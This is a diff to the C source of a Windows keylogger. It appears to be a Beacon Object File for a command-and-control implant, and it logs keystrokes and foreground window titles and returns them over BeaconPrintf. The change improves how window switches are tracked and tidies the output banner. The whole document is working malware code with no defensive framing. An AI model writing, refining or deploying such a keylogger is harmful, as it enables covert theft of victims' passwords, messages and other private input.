@@ -68,7 +68,7 @@ static DWORD  g_durationMs   = 0;
 static DWORD  g_startTick    = 0;
 static DWORD  g_hookThreadId = 0;
 static HHOOK  g_hook         = NULL;
-static char   g_lastTitle[MAX_TITLE];
+static HWND   g_lastHwnd     = NULL;
 
 static void appendLog(const char *s) {
     while (*s && g_logPos < MAX_LOG_SIZE - 1)
@@ -76,25 +76,19 @@ static void appendLog(const char *s) {
 }
 
 static void checkWindowTitle(void) {
-    char title[MAX_TITLE];
     HWND fg = GetForegroundWindow();
-    if (!fg) return;
+    if (!fg || fg == g_lastHwnd) return;
+
+    g_lastHwnd = fg;
+
+    char title[MAX_TITLE];
     int len = GetWindowTextA(fg, title, MAX_TITLE);
     if (len <= 0) return;
     title[len] = 0;
 
-    int same = 1;
-    for (int i = 0; i < MAX_TITLE; i++) {
-        if (g_lastTitle[i] != title[i]) { same = 0; break; }
-        if (title[i] == 0) break;
-    }
-
-    if (!same) {
-        memcpy(g_lastTitle, title, MAX_TITLE);
-        appendLog("\n\n[");
-        appendLog(title);
-        appendLog("]\n");
-    }
+    appendLog("\n\n[");
+    appendLog(title);
+    appendLog("]\n");
 }
 
 static const char* vkName(DWORD vk) {
@@ -172,8 +166,8 @@ void go(char *args, int alen) {
     if (duration > 300) duration = 300;
 
     memset(g_logBuf, 0, MAX_LOG_SIZE);
-    memset(g_lastTitle, 0, MAX_TITLE);
     g_logPos     = 0;
+    g_lastHwnd   = NULL;
     g_durationMs = (DWORD)duration * 1000;
     g_startTick  = GetTickCount();
     g_hookThreadId = GetCurrentThreadId();
@@ -203,7 +197,7 @@ void go(char *args, int alen) {
     g_logBuf[g_logPos] = 0;
 
     if (g_logPos > 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "=== Keylogger Output (%d seconds) ===\n%s\n=== End ===", duration, g_logBuf);
+        BeaconPrintf(CALLBACK_OUTPUT, "=== Keylogger (%ds) ===\n%s\n=== End ===", duration, g_logBuf);
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "No keystrokes captured in %d seconds.", duration);
     }
